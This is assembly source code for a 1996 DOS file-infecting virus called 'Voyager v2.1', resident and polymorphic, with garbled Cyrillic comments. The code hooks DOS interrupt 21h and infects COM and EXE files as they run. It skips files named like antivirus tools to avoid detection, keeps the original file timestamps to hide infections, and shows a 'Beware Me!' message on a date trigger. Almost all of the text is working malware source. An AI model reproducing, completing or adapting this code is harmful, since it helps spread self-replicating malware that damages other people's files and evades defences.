;������� COM&EXE.TSR.POLYMORPH �����  VOYAGER (�)
;�� ����� ������⨢��� �㭪権, ������ 2 �᫠ ������� ����� �뤠祩
;�ࠧ� "Beware Me!" ��祬 ⮫쪮 �� �᫮��� ���=����⠬ (15:15 ...)

.MODEL TINY
.CODE
.STARTUP
JUMPS

Vir_Len		equ	End_of_Vir-VStart+16 ;����� ����� �����

VStart:
	cld
	push	ds es
	
	call	$+3			
	pop	bp			;������ ������ �१ bp 
	sub	bp,offset $-1		;�.�. ����� 䠩��+ᬥ饭�� �� ������
					;�� �㦭� ��� ⮣� �⮡� ����� ��� �
					;䠩�� ࠡ����

;�஢�ઠ ����� �� �����
	mov	ax,0EBA1h
	int	21h
	cmp	ax,00DAh
	jz	Installed	;��� � �����


;��⠢�塞 ����� १������

Stay_At_Memory:

        mov     ax,ds                   ; ���४��㥬 MCB
        push    ax
	dec     ax			; ������ � ax -> MCB
        mov     ds,ax
	cmp	byte ptr ds:[0],'Z'
	je	Last_Block
	adc	ax,word ptr ds:[03]
	mov	ds,ax
Last_Block:
        mov     cl,4			;
        mov     dx,Vir_len		;
	add	dx,dx
	add	dx,1440
        shr     dx,cl			;��ॢ���� � ��ࠣ��� 

        sub     word ptr ds:[03h],dx    ; ������ MCB 
	sub     word ptr ds:[12h],dx    ; ������ ��� �ண� � PSP

	;���४�� ����� ��� BIOS
	mov	cl,6
	shr	dx,cl
	push	ds
	push	ax
	mov	ax,0
	mov	ds,ax
	inc	dx
	sub	word ptr ds:[413h],dx
	pop	ax ds

        pop     ax
        add     ax,word ptr ds:[03h]

        inc     ax                      ; es:di=���� ���� १�����
        mov     es,ax
	sub	di,di
        lea     si,[bp+VStart]
        mov     cx,Vir_Len
        repnz   movs byte ptr es:[di],cs:[si] ; �����㥬 � ������ ds:si -> es:di

        push	bx es
	pop	ds

;���࠭塞 ���� 21h �����	

	mov	ax,3521h		; Int 21h
	int	21h

	mov	word ptr ds:[Old_21-100h],bx
	mov	word ptr ds:[Old_21-100h+2],es

	pop	bx

;��⠭�������� ᢮� 21 �����

	mov	ax,2521h			; Int 21h
	lea	dx,[New_21-100h]
	int	21h

;����⠭�������� ���� ��������� 䠩��

Installed:
	call	Date
	pop	es ds
	cmp	word ptr cs:[bp+Old_Header],'ZM'
	je	EXE_Exit

	lea	si,[bp+Old_Header]
	mov	di,100h
	mov	cx,4
	repnz	movsb
	mov	ax,100h
	push	ax
	retn
EXE_Exit:
	mov	ax,ds
	add	ax,10h
	add	word ptr cs:[bp+Old_CS+2],ax
	add	word ptr cs:[bp+Old_SS+2],ax
	cli
	mov	ss,word ptr cs:[bp+Old_SS+2]
	mov	sp,word ptr cs:[bp+Old_SS]
	sti
	
	jmp	dword ptr cs:[bp+Old_CS]
	
include		$UPD15.inc	

	
;*******************************************************************************
;			����������� ����� ������
New_21:
	cmp	ax,0EBA1h	;�஢�ઠ �� १����⭮���
	jne	Continue
	mov	ax,00DAh
	iret

Continue:
	push	bp ax bx cx dx si di ds es
	call	$+3
	pop	bp		;����� ������ ������ �१ bp � ����⨢��
	sub	bp,Offset $-1

	cmp	ax,4b00h	;�㭪�� Exec
	jz	Infect
	jmp	Continue1

Jmp21h:
	xor	ax,ax
	mov	ds,ax
	mov	ax,word ptr [bp+Old24_Ofs]
	mov	word ptr ds:[24h*4],ax
	mov	ax,word ptr [bp+Old24_Seg]
	mov	word ptr ds:[24h*4+2],ax

Continue1:
	pop	es ds di si dx cx bx ax bp
	db	0eah
Old_21	dd	?

Infect:
	push	ds
	xor	ax,ax
	mov	ds,ax
	mov	ax,word ptr ds:[24h*4]
	mov	word ptr cs:[bp+Old24_Ofs],ax
	mov	ax,word ptr ds:[24h*4+2]
	mov	word ptr cs:[bp+Old24_Seg],ax
	mov	word ptr ds:[24h*4],Offset Handler24
	mov	word ptr ds:[24h*4+2],cs
	pop	ds
	
	call	Insert_Name
	mov	si,di
	push	si
	call	UpCase
	pop	si
	cmp	word ptr ds:[si],'IA'
	jne	Next1
	cmp	word ptr ds:[si+2],'SD'
	je	Jmp21h
Next1:
	cmp	word ptr ds:[si],'EW'
	je	Jmp21h
	cmp	word ptr ds:[si],'RD'
	jne	Next2
	cmp	word ptr ds:[si+2],'EW'
	je	Jmp21h
Next2:
	cmp	word ptr ds:[si],'V-'
	je	Jmp21h
	cmp	word ptr ds:[si],'OC'
	jne	Next3
	cmp	word ptr ds:[si+2],'MM'
	je	Jmp21h
Next3:
	cmp	word ptr ds:[si],'DA'
	jne	Next4
	cmp	word ptr ds:[si+2],'NI'
	je	Jmp21h
Next4:
	cmp	word ptr ds:[si],'NA'
	jne	Next5
	cmp	word ptr ds:[si+2],'IT'
	je	Jmp21h
Next5:
	cmp	word ptr ds:[si],'SM'
	jne	Name_Ok
	cmp	word ptr ds:[si+2],'VA'
	je	Jmp21h
Name_Ok:
	mov	ax,3d02h
	int	21h
	jc	Errors

	mov	bx,ax
	push	cs cs
	pop	ds es	
	mov	ax,5700h
	int	21h
	mov	word ptr cs:[bp+Old_File_Time],cx
	mov	word ptr cs:[bp+Old_File_Date],dx

	mov	ah,3fh			;���뢠�� ��������� 䠩��
	mov	cx,18h
	lea	dx,[bp+Old_Header]
	int	21h
	jc	Errors

	mov	si,dx
	cmp	word ptr [si],'ZM'
	jz	EXE

	cmp	byte ptr [si+3],15h	;Already infected
	je	Errors

	mov	al,2			;Goto EOF
	call	Lseek

					;Check file size
	cmp	ax,1024			
	jbe	Errors			;Close if file is short
	cmp	ax,60000
	jae	Errors			;Close if file is big			

	sub	ax,3
	mov	word ptr cs:[bp+New_Header+1],ax ;Create new header

	lea	si,[bp+VStart]
	lea	di,[bp+End_of_Vir+16]
	mov	cx,Vir_Len

	call	$UPD

	mov	dx,di
	call	Write_Data		;Write virus body to EOF

	mov	al,0
	call	Lseek			

	mov	cx,4
	lea	dx,[bp+New_Header]
	call	Write_Data		;Write new header to file
	jmp	Repair			;����뢠�� 䠩�


Lseek:						
	mov	ah,42h			;��楤�� ����樮��஢���� 
	xor	cx,cx			;㪠��⥫�
	xor 	dx,dx
	int	21h
	ret

Write_Data:
	mov	ah,40h
	int	21h
	ret

Repair:
	mov	ax,5701h
	mov	cx,word ptr cs:[bp+Old_File_Time]
	mov	dx,word ptr cs:[bp+Old_File_Date]
	int	21h

Errors:
	mov	ah,3eh
	int	21h
	jmp	Jmp21h

EXE:
	cmp	word ptr cs:[si+12h],'gS'		;Already infected
	je	Errors

	mov	al,2
	call	Lseek
	mov	word ptr cs:[bp+F_Len],dx

	push	ax dx ax dx
	cmp	ax,1024
	jbe	Errors
	cmp	dx,8
	ja	Errors

	mov	word ptr [si+12h],'gS'		;VirusID
	mov	ax,word ptr [si+14h]		
	mov	word ptr cs:[bp+Old_CS],ax	;Save old cs:ip
	mov	ax,word ptr [si+16h]
	mov	word ptr cs:[bp+Old_CS+2],ax
	mov	ax,word ptr [si+10h]		;Save old ss:sp
	mov	word ptr cs:[bp+Old_SS],ax
	mov	ax,word ptr [si+0eh]
	mov	word ptr cs:[bp+Old_SS+2],ax

	pop	dx ax
	
	mov	cx,10h		;Make new code entry
	div	cx
	
	sub	ax,word ptr [si+8h]	;Here new cs:ip
	sbb	dx,0			
	mov	word ptr [si+14h],dx

	mov	word ptr [si+16h],ax	
					;Here new ss:sp
	mov	word ptr [si+0eh],ax
	mov	word ptr [si+10h],(Vir_Len*2)+2000h

	push	si

	lea	si,[bp+VStart]
	lea	di,[bp+End_of_Vir+16]
	mov	cx,Vir_Len
	call	$UPD
	mov	word ptr cs:[bp+ADD_Addr],cx
	mov	dx,di
	call	Write_Data

	pop	si dx ax
	sub	dx,dx
	add	ax,1234h
ADD_Addr	=	$-2
	adc	dx,word ptr cs:[bp+F_Len]

	mov	cx,200h
	div	cx

	mov	word ptr [si+2],dx
	inc	ax
	mov	word ptr [si+4],ax

	mov	al,0
	call	Lseek

	lea	dx,[bp+Old_Header]
	mov	cx,18h
	call	Write_Data
	jmp	Repair

VirusID		db 'Voyager v2.1 (c) 1996 by Shy Guy.'

Handler24:
	mov	al,3
	iret

Date:	
	push	cs
	pop	ds
	mov	ah,2ah
	int	21h
	cmp	dl,2
	jnz	Get_Out
	mov	ah,2ch
	int	21h
	cmp	ch,cl
	jnz	Get_Out
	mov	ah,9
	lea	dx,[bp+MSG]
	int	21h
Get_Out:
	retn
; �室: ds:dx=���� � 䠩��
; ��室: ds:di=��� 䠩��

Insert_Name:
	cld
	mov	si,dx
	mov	di,dx

Rep_Find_Name:
	lodsb
	cmp	al,'\'
	jne	@@Pass1
	mov	di,si
@@Pass1:
	cmp	al,':'
	jne	@@Pass2
	mov	di,si
@@Pass2:
	or	al,al
	jnz	Rep_Find_Name

	retn

; �室: ds:si=���� � 䠩��

UpCase:
	mov	di,si
Rep_UpCase:
	lodsb
	cmp	al,'a'
	jb	Not_Upcase
	cmp	al,'z'
	ja	Not_Upcase
	xor	al,' '
Not_Upcase:
	stosb
	test	al,al
	jnz	Rep_UpCase

	retn

MSG		db	'Beware Me!',0ah,0dh,'$'
Old_File_Time	dw	?
Old_File_Date	dw	?
F_Len		dw	?
Old_CS		dd	?
Old_SS		dd	?
Old24_Ofs	dw	?
Old24_Seg	dw	?
New_Header	db 	0E9h,0,0,15h
Old_Header	db	0cdh,20h,?,?,14h dup(?)	

End_of_Vir:
	END